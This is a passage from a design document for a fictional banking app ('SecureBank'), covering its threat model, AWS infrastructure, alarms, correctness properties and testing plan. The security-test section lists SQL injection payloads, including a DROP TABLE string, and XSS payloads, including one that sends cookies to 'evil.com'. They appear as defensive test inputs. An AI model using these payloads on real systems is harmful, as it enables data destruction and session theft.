| 9 | **Information Disclosure** | JWT payload reveals sensitive user data | Decoded (base64) JWT | JWT payload contains only: sub (user_id UUID), role, iat, exp — no PII, no account numbers | Negligible — UUID and role are non-sensitive |
| 10 | **Information Disclosure** | Error messages reveal internal state (stack traces, SQL errors) | Probing API with malformed requests | Centralised error handler returns generic error codes; stack traces logged server-side only; production NODE_ENV suppresses verbose errors | Low — error format is controlled |
| 11 | **Denial of Service** | Rate-limit bypass via IP spoofing / distributed brute force | Distributed bot attack | Rate limit applied at Express layer (100 req/min/IP) and reinforced by WAF; ALB access logs for detection; CloudWatch alarm on 429 rate spike | Medium — sophisticated distributed attacks may partially bypass IP-based rate limiting; consider CAPTCHA for repeated failures |
| 12 | **Denial of Service** | Large payload attacks consuming API memory | Oversized JSON bodies | express.json() body size limit (e.g., 100kb); AJV schema validation rejects extra fields; WAF body size rules | Low — hard size limits prevent memory exhaustion |
| 13 | **Elevation of Privilege** | CUSTOMER role user calls BRANCH_MANAGER or ADMIN endpoints | Modified JWT role claim or missing RBAC check | RBAC middleware applied after JWT verification on every route; role extracted from verified JWT claim only — never from request body | Low — RBAC enforced independently of client input |
| 14 | **Elevation of Privilege** | IDOR — Customer A accesses Customer B's accounts by guessing UUIDs | Account UUID enumeration | Ownership check in every Account/Transaction/Transfer service verifying JWT sub matches resource owner_user_id | Low — UUIDs are non-guessable and ownership is always verified |
| 15 | **Elevation of Privilege** | Container escape escalates to RDS or Secrets Manager | Compromised ECS task | ECS task IAM role grants least-privilege (Secrets Manager read for specific ARNs, ECR pull); RDS security group allows only ECS task SG on port 5432; no SSH or exec access to Fargate tasks | Low — blast radius limited to the specific task's IAM role |


---

## Infrastructure Design

### Terraform Module Structure

```
infrastructure/
├── main.tf                  # Root module — calls all child modules
├── variables.tf             # Root variables (region, env, app name)
├── outputs.tf               # Root outputs (ALB DNS, ECR URLs, etc.)
├── backend.tf               # S3 + DynamoDB state backend
│
├── modules/
│   ├── networking/          # VPC, subnets, IGW, NAT GW, route tables, SGs
│   │   ├── main.tf
│   │   ├── variables.tf
│   │   └── outputs.tf
│   │
│   ├── ecs/                 # ECS cluster, task definitions, services, IAM roles
│   │   ├── main.tf
│   │   ├── task_definitions/
│   │   │   ├── frontend.json.tpl   # NGINX+React container def
│   │   │   └── api.json.tpl        # Node.js API container def
│   │   ├── variables.tf
│   │   └── outputs.tf
│   │
│   ├── rds/                 # RDS PostgreSQL, subnet group, parameter group
│   │   ├── main.tf
│   │   ├── variables.tf
│   │   └── outputs.tf
│   │
│   ├── alb/                 # ALB, listeners, target groups, ACM cert, WAF
│   │   ├── main.tf
│   │   ├── variables.tf
│   │   └── outputs.tf
│   │
│   ├── ecr/                 # ECR repos for frontend and API images
│   │   ├── main.tf
│   │   └── outputs.tf
│   │
│   ├── secrets/             # Secrets Manager secrets + IAM policies
│   │   ├── main.tf
│   │   └── outputs.tf
│   │
│   ├── elasticache/         # Redis cluster for session/token store
│   │   ├── main.tf
│   │   └── outputs.tf
│   │
│   ├── monitoring/          # CloudWatch log groups, alarms, SNS topic
│   │   ├── main.tf
│   │   ├── variables.tf
│   │   └── outputs.tf
│   │
│   └── cicd/                # CodePipeline, CodeBuild projects, S3 artifact bucket
│       ├── main.tf
│       ├── buildspec.yml
│       ├── variables.tf
│       └── outputs.tf
│
└── environments/
    ├── dev/
    │   ├── terraform.tfvars
    │   └── backend.tfvars
    └── prod/
        ├── terraform.tfvars
        └── backend.tfvars
```

### ECS Task Definitions

#### Frontend Task (NGINX + React SPA)

```json
{
  "family": "securebank-frontend",
  "cpu": "256",
  "memory": "512",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "executionRoleArn": "arn:aws:iam::ACCOUNT:role/ecsTaskExecutionRole",
  "containerDefinitions": [
    {
      "name": "nginx-react",
      "image": "ACCOUNT.dkr.ecr.REGION.amazonaws.com/securebank-frontend:COMMIT_SHA",
      "portMappings": [{ "containerPort": 80, "protocol": "tcp" }],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "/ecs/securebank-frontend",
          "awslogs-region": "us-east-1",
          "awslogs-stream-prefix": "ecs"
        }
      },
      "healthCheck": {
        "command": ["CMD-SHELL", "curl -f http://localhost/health || exit 1"],
        "interval": 30,
        "timeout": 5,
        "retries": 3,
        "startPeriod": 10
      }
    }
  ]
}
```

#### API Task (Node.js/Express)

```json
{
  "family": "securebank-api",
  "cpu": "512",
  "memory": "1024",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "executionRoleArn": "arn:aws:iam::ACCOUNT:role/ecsTaskExecutionRole",
  "taskRoleArn": "arn:aws:iam::ACCOUNT:role/securebank-api-task-role",
  "containerDefinitions": [
    {
      "name": "api",
      "image": "ACCOUNT.dkr.ecr.REGION.amazonaws.com/securebank-api:COMMIT_SHA",
      "portMappings": [{ "containerPort": 3000, "protocol": "tcp" }],
      "secrets": [
        { "name": "DB_URL",         "valueFrom": "arn:aws:secretsmanager:...:secret:securebank/db-url" },
        { "name": "JWT_PRIVATE_KEY","valueFrom": "arn:aws:secretsmanager:...:secret:securebank/jwt-private-key" },
        { "name": "AES_KEY",        "valueFrom": "arn:aws:secretsmanager:...:secret:securebank/aes-key" }
      ],
      "environment": [
        { "name": "NODE_ENV", "value": "production" },
        { "name": "PORT",     "value": "3000" }
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "/ecs/securebank-api",
          "awslogs-region": "us-east-1",
          "awslogs-stream-prefix": "ecs"
        }
      },
      "healthCheck": {
        "command": ["CMD-SHELL", "curl -f http://localhost:3000/health || exit 1"],
        "interval": 30,
        "timeout": 5,
        "retries": 3,
        "startPeriod": 15
      }
    }
  ]
}
```

### CodePipeline Stages

```
Source Stage
  └── Source: GitHub (main branch) via CodeStar connection
      └── Output artifact: SourceArtifact

Build & Test Stage (CodeBuild: securebank-build)
  ├── npm ci
  ├── npm run lint
  ├── npm run test:unit        (Jest — must pass, 80% coverage gate)
  ├── npm run test:integration (Supertest against local DB)
  ├── npm run test:security    (custom SQLi/XSS/unauth checks)
  ├── trivy image scan         (CRITICAL findings block pipeline)
  └── Output artifact: BuildArtifact (Docker image digest)

Docker Build & Push Stage (CodeBuild: securebank-docker)
  ├── docker build -t frontend:$COMMIT_SHA ./frontend
  ├── docker build -t api:$COMMIT_SHA ./api
  ├── docker push ECR/securebank-frontend:$COMMIT_SHA
  ├── docker push ECR/securebank-api:$COMMIT_SHA
  └── Output: image tags manifest

Deploy Stage (ECS Rolling Deployment)
  ├── Update ECS service: securebank-frontend (minimumHealthyPercent: 50)
  └── Update ECS service: securebank-api     (minimumHealthyPercent: 50)
```

### CloudWatch Alarms and SNS Alert Configuration

```
Alarm: API-5xx-ErrorRate
  ├── Metric:      AWS/ApplicationELB HTTPCode_Target_5XX_Count / RequestCount * 100
  ├── Threshold:   > 5 (percent)
  ├── Period:      300 seconds (5 minutes)
  ├── EvalPeriods: 1
  ├── Statistic:   Sum / Sum
  └── AlarmAction: SNS topic arn:aws:sns:REGION:ACCOUNT:securebank-alerts

Alarm: API-4xx-SpikeRate
  ├── Metric:      AWS/ApplicationELB HTTPCode_Target_4XX_Count
  ├── Threshold:   > 500 (count in 5 min — potential attack signal)
  ├── Period:      300 seconds
  └── AlarmAction: SNS topic securebank-alerts

Alarm: RDS-CPUUtilization
  ├── Metric:      AWS/RDS CPUUtilization
  ├── Threshold:   > 80 (percent)
  ├── Period:      300 seconds
  └── AlarmAction: SNS topic securebank-alerts

Alarm: ECS-API-MemoryUtilization
  ├── Metric:      ECS/ContainerInsights MemoryUtilized
  ├── Threshold:   > 900 MB  (90% of 1024 MB task memory)
  ├── Period:      300 seconds
  └── AlarmAction: SNS topic securebank-alerts

Alarm: FailedLoginAttempts
  ├── Metric:      Custom metric securebank/auth FailedLoginAttempt
  ├── Threshold:   > 50 (count in 5 min)
  ├── Period:      300 seconds
  └── AlarmAction: SNS topic securebank-alerts

SNS Topic: securebank-alerts
  ├── Protocol: email
  ├── Endpoint: ops-team@securebank.example.com
  └── Delivery policy: immediate (no batching)
      Note: CloudWatch publishes to SNS within 60 seconds of ALARM state transition
```


---

## Correctness Properties

*A property is a characteristic or behavior that should hold true across all valid executions of a system — essentially, a formal statement about what the system should do. Properties serve as the bridge between human-readable specifications and machine-verifiable correctness guarantees. PBT library: [fast-check](https://github.com/dubzzz/fast-check) (TypeScript/JavaScript). Each property test runs a minimum of 100 iterations.*

### Property 1: Double-Entry Bookkeeping Invariant

*For any* valid fund transfer between two accounts, the system SHALL create exactly one DEBIT ledger entry and one CREDIT ledger entry, both with identical absolute amounts equal to the transfer amount, and both linked by the same `transfer_ref_id`.

**Validates: Requirements 5.3, 15.1, 15.2, 15.3**

### Property 2: Idempotency of Fund Transfers

*For any* transfer request submitted with idempotency key K that has already been successfully processed, re-submitting the identical request with the same K SHALL return the original transfer response and SHALL NOT create any additional ledger entries or modify any account balances.

**Validates: Requirements 5.5**

### Property 3: Transfer Limit Enforcement

*For any* beneficiary B with daily limit L, and any sequence of transfers to B within a single calendar day whose cumulative total equals or exceeds L, the next transfer attempt to B SHALL be rejected with HTTP 422 — regardless of the individual transfer amounts or their order of submission.

**Validates: Requirements 6.1, 6.2, 6.3**

### Property 4: Loan EMI Eligibility Rule

*For any* loan application where (calculated_EMI + existing_monthly_EMIs) > 0.40 x gross_monthly_income, the Loan_Service SHALL return a decision of REJECTED. *For any* loan application where (calculated_EMI + existing_monthly_EMIs) is less than or equal to 0.40 x gross_monthly_income, the Loan_Service SHALL return a decision of APPROVED. There is no input combination that satisfies both conditions simultaneously.

**Validates: Requirements 8.2, 8.3**

### Property 5: EMI Calculation Correctness (Reducing-Balance Formula)

*For any* valid triple (loan_amount P, monthly_rate r = annual_rate / 12 / 100, tenure_months n), the calculated EMI SHALL equal P x r x (1 + r)^n / ((1 + r)^n - 1), within a tolerance of plus or minus 0.01 INR due to rounding.

**Validates: Requirements 8.1**

### Property 6: Balance Consistency After Transfer

*For any* successful fund transfer of amount A from account S to account D, the resulting balance of S SHALL equal its pre-transfer balance minus A, and the resulting balance of D SHALL equal its pre-transfer balance plus A. The sum of (S_balance + D_balance) SHALL be identical before and after the transfer.

**Validates: Requirements 5.3, 5.4, 15.1**

### Property 7: JWT Expiry Enforcement

*For any* JWT whose exp claim is in the past (exp less than now), the API_Gateway SHALL reject all requests bearing that token with HTTP 401, regardless of which endpoint is called or what role the token carries.

**Validates: Requirements 1.1, 2.1, 2.5, 3.5**

### Property 8: Account Lockout After Five Failures

*For any* user account, after exactly 5 consecutive failed login attempts (wrong password), the account SHALL have is_locked equal to TRUE and all subsequent login attempts SHALL return HTTP 423, regardless of whether the subsequent attempt uses the correct password.

**Validates: Requirements 1.2, 1.3, 1.4**

### Property 9: Account Ownership Isolation

*For any* two distinct customers A and B, customer A's authenticated requests to account, transaction, or transfer endpoints SHALL never return data belonging to customer B. Any such cross-customer request SHALL return HTTP 403 with no resource data in the body.

**Validates: Requirements 4.3, 7.7**

### Property 10: PII Encryption Round-Trip

*For any* plaintext PAN or Aadhaar value V, encrypting V with AES-256-GCM and then decrypting the result SHALL produce a value equal to V. The ciphertext stored in the DB SHALL never equal the plaintext V (byte-for-byte comparison).

**Validates: Requirements 9.1, 9.2**

### Property 11: Transaction Filter Completeness

*For any* set of query filters (date range, amount range, entry type) applied to a paginated transaction query, every returned transaction SHALL satisfy all applied filters simultaneously, and no transaction satisfying all filters SHALL be absent from the complete (all-pages) result set.

**Validates: Requirements 7.2, 7.3, 7.4**

### Property 12: Running Balance Monotonic Consistency

*For any* ordered sequence of transaction records for a single account, the running_balance on each record SHALL equal the running_balance of the immediately preceding record plus the signed amount of the current record (CREDIT is positive, DEBIT is negative), with the first record's running balance equalling its signed amount applied to the account's opening balance.

**Validates: Requirements 7.5**

### Property 13: Password Storage Never Plaintext

*For any* password string P submitted during registration or password change, the value stored in users.password_hash SHALL be a valid bcrypt hash string with a work factor N greater than or equal to 12, and SHALL NOT equal P byte-for-byte.

**Validates: Requirements 1.8**

## Error Handling

### Standard Error Response Format

All API errors return a JSON body in the following structure:

```json
{
  "code":       "INSUFFICIENT_FUNDS",
  "message":    "The source account does not have sufficient balance for this transfer.",
  "details":    ["available_balance: 5000.00", "requested_amount: 8000.00"],
  "correlation_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
}
```

| Field            | Type           | Description                                               |
|------------------|----------------|-----------------------------------------------------------|
| `code`           | string (enum)  | Machine-readable error code (see table below)             |
| `message`        | string         | Human-readable explanation (no stack traces in prod)      |
| `details`        | string[]       | Optional per-field validation messages                    |
| `correlation_id` | UUID string    | Matches the request's correlation ID in server logs       |

### HTTP Status Code Mapping

| HTTP Status | Error Code                   | Scenario                                          |
|-------------|------------------------------|---------------------------------------------------|
| 400         | `VALIDATION_ERROR`           | Request body fails JSON schema validation         |
| 400         | `INVALID_AMOUNT`             | Transfer amount ≤ 0                               |
| 400         | `INVALID_TRANSFER_MODE`      | Mode not NEFT or IMPS                             |
| 400         | `INVALID_LOAN_PARAMS`        | Zero/negative income, tenure, or loan amount      |
| 401         | `UNAUTHENTICATED`            | Missing, expired, or invalid JWT                  |
| 401         | `OTP_INVALID`                | Wrong or expired OTP                              |
| 401         | `TOKEN_REVOKED`              | JWT or refresh token on revocation list           |
| 403         | `FORBIDDEN`                  | Valid token but insufficient role                 |
| 403         | `ACCOUNT_NOT_OWNED`          | Requested account belongs to another customer     |
| 403         | `WAF_BLOCK`                  | Request blocked by WAF SQLi/XSS rules             |
| 404         | `NOT_FOUND`                  | Resource not found (transfer, beneficiary, etc.)  |
| 422         | `INSUFFICIENT_FUNDS`         | Source balance < transfer amount                  |
| 422         | `DAILY_LIMIT_EXCEEDED`       | Transfer would exceed beneficiary daily limit     |
| 423         | `ACCOUNT_LOCKED`             | Account locked after 5 failed login attempts      |
| 429         | `RATE_LIMIT_EXCEEDED`        | More than 100 requests/min from source IP         |
| 500         | `LEDGER_INTEGRITY_ERROR`     | Debit ≠ credit amount; transaction aborted        |
| 500         | `DB_WRITE_FAILED`            | Loan application DB write failed; status=PENDING  |
| 500         | `INTERNAL_ERROR`             | Unexpected server error                           |
| 503         | `DB_UNAVAILABLE`             | Cannot reach RDS; includes Retry-After: 30 header |

### Retry Strategy for Transient Failures

The API client (React SPA) and inter-service calls implement exponential backoff for transient errors:

```
Max retries:    3
Base delay:     200 ms
Max delay:      5000 ms
Backoff factor: 2×  (200ms → 400ms → 800ms)
Jitter:         ±50 ms random to prevent thundering herd
Retryable:      HTTP 503, HTTP 429 (after Retry-After), network timeout
Non-retryable:  HTTP 400, 401, 403, 404, 422, 423, 500
```

### Circuit Breaker Pattern for Database

The API uses a circuit breaker (implemented via the `opossum` library) around all DB connection pool calls:

```
States:        CLOSED → OPEN → HALF_OPEN → CLOSED
Threshold:     50% failure rate over 10-second window
Open duration: 30 seconds (then transitions to HALF_OPEN)
Test requests: 1 probe request in HALF_OPEN state
Success:       HALF_OPEN → CLOSED (normal operation resumes)
Failure:       HALF_OPEN → OPEN (continues waiting)

When OPEN:     Return HTTP 503 immediately without attempting DB call
               Include header: Retry-After: 30
               Log WARNING with circuit state and correlation ID
```

This prevents connection pool exhaustion cascading from a DB outage into application-layer failures across all requests.


---

## Testing Strategy

### Overview

SecureBank uses a layered testing approach: unit tests (Jest) for business logic and pure functions, integration tests (Supertest) for full API request/response flows, property-based tests (fast-check) for invariant verification, security tests for OWASP Top 10 vectors, and load tests (Artillery) for performance validation. The minimum overall coverage target is **80%** (lines + branches).

---

### Unit Tests (Jest)

**Location**: `api/src/**/__tests__/*.unit.test.ts`

**Test structure per service module:**

```
auth.service.unit.test.ts
  ├── hashPassword()       — bcrypt hash format, cost factor ≥ 12
  ├── verifyPassword()     — correct match / wrong match
  ├── generateOtp()        — 6-digit numeric string
  ├── signJwt()            — exp = iat + 900, correct role claim
  └── verifyJwt()          — valid / expired / tampered

account.service.unit.test.ts
  ├── maskAccountNumber()  — returns last-4 prefix with ****
  └── formatBalance()      — 2 decimal places, INR

transfer.service.unit.test.ts
  ├── validateBalance()    — sufficient / insufficient
  ├── checkDailyLimit()    — under / at / over limit
  └── buildLedgerEntries() — debit + credit, equal amounts, same ref_id

loan.service.unit.test.ts
  ├── calculateEmi()       — reducing-balance formula correctness
  ├── checkEligibility()   — approve / reject boundary at 40%
  └── validateLoanInput()  — zero/negative field rejection

transaction.service.unit.test.ts
  ├── applyFilters()       — date, amount, type filters
  ├── calculateRunningBalance() — sequential invariant
  └── toCsv()             — UTF-8, correct headers, all rows present
```

**Coverage gates** (enforced in Jest config):
```json
{
  "coverageThreshold": {
    "global": {
      "branches": 80,
      "functions": 80,
      "lines": 80,
      "statements": 80
    }
  }
}
```

---

### Integration Tests (Supertest)

**Location**: `api/src/**/__tests__/*.integration.test.ts`

**Setup**: Each test suite spins up the Express app (`app.ts`) with a real PostgreSQL test database (Docker container seeded with fixtures) and a mocked Redis (ioredis-mock). AWS SNS calls are mocked with `aws-sdk-client-mock`.

**Key test scenarios:**

```
auth.integration.test.ts
  ├── POST /auth/login  — valid credentials → 200 + mfa_challenge_id
  ├── POST /auth/login  — wrong password ×5 → account locked → 423
  ├── POST /auth/mfa    — valid OTP → 200 + JWT + refresh_token
  ├── POST /auth/mfa    — expired OTP → 401
  ├── POST /auth/refresh — valid token → 200 + new tokens, old revoked
  └── POST /auth/logout  — 200, both tokens on revocation list

accounts.integration.test.ts
  ├── GET /accounts          — returns all accounts with masked numbers
  ├── GET /accounts          — another customer's token → 403
  └── GET /accounts/{id}/mini-statement — returns ≤10 transactions

transfers.integration.test.ts
  ├── POST /transfers — valid transfer → 201, ledger entries created
  ├── POST /transfers — same idempotency_key → 201, no new entries
  ├── POST /transfers — insufficient funds → 422
  └── POST /transfers — daily limit exceeded → 422

loans.integration.test.ts
  ├── POST /loans/eligibility — approved case → 200 + APPROVED
  ├── POST /loans/eligibility — rejected case → 200 + REJECTED
  └── GET  /loans             — CUSTOMER sees own; ADMIN sees all
```

---

### Property-Based Tests (fast-check)

**Location**: `api/src/**/__tests__/*.property.test.ts`

**Configuration**: Each property test runs a minimum of **100 iterations** (set via `{ numRuns: 100 }` in fast-check options).

**Tag format**: Each test is tagged with a comment referencing its design property:
```typescript
// Feature: secure-bank, Property 1: Double-entry bookkeeping invariant
```

**Property test list** (one test per design property):

```
bookkeeping.property.test.ts
  // Feature: secure-bank, Property 1: Double-entry bookkeeping invariant
  fc.assert(fc.property(
    fc.record({ amount: fc.float({ min: 0.01, max: 1e9 }), ... }),
    ({ amount }) => {
      const entries = buildLedgerEntries(transfer);
      return entries.debit.amount === entries.credit.amount
          && entries.debit.amount === amount
          && entries.debit.transfer_ref_id === entries.credit.transfer_ref_id;
    }
  ), { numRuns: 100 });

  // Feature: secure-bank, Property 2: Idempotency of fund transfers
  // Feature: secure-bank, Property 3: Transfer limit enforcement
  // Feature: secure-bank, Property 4: Loan EMI eligibility rule
  // Feature: secure-bank, Property 5: EMI calculation correctness
  // Feature: secure-bank, Property 6: Balance consistency after transfer
  // Feature: secure-bank, Property 12: Running balance monotonic consistency
  // Feature: secure-bank, Property 13: Password storage never plaintext

auth.property.test.ts
  // Feature: secure-bank, Property 7: JWT expiry enforcement
  // Feature: secure-bank, Property 8: Account lockout after five failures

pii.property.test.ts
  // Feature: secure-bank, Property 10: PII encryption round-trip

transactions.property.test.ts
  // Feature: secure-bank, Property 11: Transaction filter completeness
```

---

### Security Tests

**Location**: `api/src/__tests__/security/`

**SQL Injection test cases** (`sqli.security.test.ts`):

```typescript
const sqliPayloads = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "1 UNION SELECT * FROM users--",
  "' AND SLEEP(5)--",
  "admin'--",
  "1; SELECT pg_sleep(5)--",
];

// Each payload submitted as: username, account_id path param,
// narration field, beneficiary name — expect 400 (validation)
// or 422 (business error) — never 500 or data leakage
```

**XSS test cases** (`xss.security.test.ts`):

```typescript
const xssPayloads = [
  "<script>alert('xss')</script>",
  "<img src=x onerror=alert(1)>",
  "javascript:alert(document.cookie)",
  "<svg onload=fetch('//evil.com?c='+document.cookie)>",
  "';alert(String.fromCharCode(88,83,83))//",
];

// Each payload submitted in string fields (narration, name, etc.)
// Verify: stored value is sanitised (no raw tags), response body
// does not echo raw payload, CSP header present
```

**Unauthorised access test cases** (`authz.security.test.ts`):

```typescript
// 1. No token → 401 on all protected routes
// 2. Expired token → 401
// 3. Tampered token (modified payload) → 401
// 4. CUSTOMER token accessing ADMIN-only endpoint → 403
// 5. Customer A token requesting customer B's account UUID → 403
// 6. Valid token, missing Bearer prefix → 401
// 7. Token with unknown role claim ("SUPERADMIN") → 403
```

---

### Load Tests (Artillery)

**Location**: `load-tests/transfers.yml`

**Target endpoint**: `POST /transfers` — the most write-intensive and latency-sensitive endpoint.

```yaml
config:
  target: "https://api.securebank.example.com/v1"
  phases:
    - name: "Warm-up"
      duration: 60
      arrivalRate: 5
    - name: "Ramp-up"
      duration: 120
      arrivalRate: 5
      rampTo: 50
    - name: "Sustained load"
      duration: 300
      arrivalRate: 50
    - name: "Spike"
      duration: 60
      arrivalRate: 200
  defaults:
    headers:
      Authorization: "Bearer {{ $processEnvironment.TEST_JWT }}"
      Content-Type: "application/json"

scenarios:
  - name: "Fund transfer"
    flow:
      - post:
          url: "/transfers"
          json:
            source_account_id: "{{ sourceAccountId }}"
            dest_account_id:   "{{ destAccountId }}"
            amount:            "{{ amount }}"
            transfer_mode:     "IMPS"
            idempotency_key:   "{{ $randomString(36) }}"
          expect:
            - statusCode: 201

ensure:
  p95: 500      # 95th percentile response time < 500ms
  p99: 1000     # 99th percentile response time < 1s
  maxErrorRate: 1  # Error rate < 1%
```

**Additional load test targets** (`load-tests/auth.yml`):
- `POST /auth/login` — ramp to 100 req/min to validate rate-limiting cuts in at threshold.

---
